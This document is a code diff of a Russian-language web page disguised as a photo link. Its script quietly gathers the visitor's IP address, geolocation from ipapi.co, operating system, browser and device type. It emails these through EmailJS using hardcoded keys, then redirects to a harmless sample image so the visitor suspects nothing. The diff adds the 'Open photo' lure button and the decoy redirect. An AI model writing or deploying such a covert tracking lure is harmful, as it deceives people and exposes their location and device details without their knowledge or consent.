@@ -1,42 +1,47 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Отправка информации</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
 <body>
-  <script>
-    emailjs.init("TEWzd8Aj5uS0d7yeq"); // Твой публичный ключ
 
-    // Функция для простого определения устройства/ОС/браузера
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
+<button id="open">Открыть фото</button>
 
-      let os = "Неизвестно";
-      if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10";
-      else if (ua.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
-      else if (ua.indexOf("Mac OS X") !== -1) os = "Mac OS";
-      else if (/Android/.test(ua)) os = "Android";
-      else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";
-      else if (/Linux/.test(ua)) os = "Linux";
+<script>
+  emailjs.init("TEWzd8Aj5uS0d7yeq"); // Публичный ключ
 
-      let browser = "Неизвестно";
-      if (/Chrome/.test(ua)) browser = "Chrome";
-      else if (/Firefox/.test(ua)) browser = "Firefox";
-      else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
-      else if (/Edge/.test(ua)) browser = "Edge";
+  // Определяем устройство и браузер
+  function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let os = "Неизвестно";
+    if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10";
+    else if (ua.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
+    else if (ua.indexOf("Mac OS X") !== -1) os = "Mac OS";
+    else if (/Android/.test(ua)) os = "Android";
+    else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";
+    else if (/Linux/.test(ua)) os = "Linux";
 
-      let device = /Mobile|Android|iPhone|iPad/.test(ua) ? "Мобильное устройство" : "ПК";
+    let browser = "Неизвестно";
+    if (/Chrome/.test(ua)) browser = "Chrome";
+    else if (/Firefox/.test(ua)) browser = "Firefox";
+    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
+    else if (/Edge/.test(ua)) browser = "Edge";
 
-      return { os, browser, device, userAgent: ua };
-    }
+    let device = /Mobile|Android|iPhone|iPad/.test(ua) ? "Мобильное устройство" : "ПК";
 
+    return { os, browser, device, userAgent: ua };
+  }
+
+  document.getElementById("open").onclick = () => {
     const deviceInfo = getDeviceInfo();
 
+    // Получаем IP и геолокацию
     fetch('https://ipapi.co/json/')
       .then(res => res.json())
       .then(data => {
+        // Отправка Email
         return emailjs.send("service_md495n5", "template_juupnvs", {
           ip: data.ip,
           country: data.country_name,
@@ -49,14 +54,16 @@
         });
       })
       .then(() => {
-        window.location.href = 'https://www.google.com';
+        // После успешной отправки — переходим на фото
+        window.location.href = 'https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png';
       })
       .catch(e => {
         console.error('Ошибка при отправке письма:', e);
-        setTimeout(() => {
-          window.location.href = 'https://www.google.com';
-        }, 3000);
+        // Даже если ошибка, переходим на фото
+        window.location.href = 'https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png';
       });
-  </script>
+  };
+</script>
+
 </body>
 </html>
